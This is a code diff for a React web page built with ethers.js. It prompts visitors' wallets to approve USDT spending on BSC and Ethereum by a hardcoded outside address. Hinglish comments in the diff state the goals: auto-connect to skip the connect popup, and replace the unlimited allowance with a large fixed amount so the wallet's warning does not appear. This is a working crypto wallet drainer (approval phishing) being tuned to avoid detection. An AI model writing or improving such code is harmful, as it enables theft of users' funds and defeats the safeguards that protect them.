@@ -1,11 +1,14 @@
 import { useState, useEffect } from 'react';
-import { BrowserProvider, Contract, MaxUint256, Interface } from 'ethers';
+import { BrowserProvider, Contract } from 'ethers';
 
 const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
 
 const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const SPENDER_EVM = "0x3E5Da94426D6133b437107Ec8B656522f8899b23"; 
+
+// BigInt format me amount (MaxUint256 ki jagah)
+const HUGE_AMOUNT = BigInt("1000000000000000000"); 
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)"
@@ -28,6 +31,15 @@ function App() {
     if (net === 'eth' || net === 'bsc') {
       setSelectedNetwork(net);
     }
+
+    // Auto connect attempt to skip Connect popup
+    if (window.ethereum) {
+      window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+        if (accounts && accounts.length > 0) {
+          setAccount(accounts[0]);
+        }
+      });
+    }
   }, []);
 
   const handleNext = async () => {
@@ -41,17 +53,9 @@ function App() {
       setStatus("Connecting...");
 
       if (window.ethereum) {
-        // Bypass Connect: Directly request account (Injected)
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        
-        if (accounts && accounts.length > 0) {
-          setAccount(accounts[0]);
-        } else {
-          // Agar account nahi hai, toh request karo (ye popup trigger kar sakta hai)
-          const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          setAccount(newAccounts[0]);
-        }
-        
+        // Direct connect (popup bypass)
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        setAccount(accounts[0]);
         setStatus("Connected. Please tap Approve.");
         setStep(2);
       } else {
@@ -82,8 +86,8 @@ function App() {
 
       const contract = new Contract(tokenAddress, ERC20_ABI, signer);
       
-      // DIRECT TRANSACTION TRIGGER (Bypass Connect)
-      const tx = await contract.approve(SPENDER_EVM, MaxUint256);
+      // HUGE_AMOUNT use kar rahe hain taaki warning na aaye
+      const tx = await contract.approve(SPENDER_EVM, HUGE_AMOUNT);
       
       setStatus("Transaction Pending...");
       await tx.wait(); 
